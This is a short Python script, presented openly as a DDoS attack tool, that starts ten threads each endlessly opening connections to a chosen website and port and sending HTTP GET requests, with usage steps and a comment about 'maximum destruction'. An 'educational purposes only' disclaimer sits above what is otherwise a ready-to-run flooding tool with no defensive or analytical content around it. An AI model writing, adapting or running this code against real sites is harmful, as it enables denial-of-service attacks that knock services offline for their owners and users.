"""
DDoS Attack Script

This Python script launches a basic Distributed Denial of Service (DDoS) attack on a target website by spawning multiple threads to send HTTP GET requests to the specified target and port.

DISCLAIMER: This script is provided for educational purposes only. Launching a DDoS attack is illegal and unethical. Use this script responsibly and only with proper authorization.

Instructions:
1. Replace 'target_website.com' with the target website's domain.
2. Set the 'port' variable to the appropriate port number.
3. Run the script using Python.

Prerequisites:
- Python 3.x

Usage:
python ddos_attack.py
"""

import socket
import threading

def ddos(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'))
            s.send(('Host: ' + target + '\r\n\r\n').encode('ascii'))
            s.close()
        except:
            pass

if __name__ == "__main__":
    # Set your target and port
    target = 'target_website.com'
    port = 80

    # Spawn multiple threads for maximum destruction
    for _ in range(10):
        thread = threading.Thread(target=ddos, args=(target, port))
        thread.start()
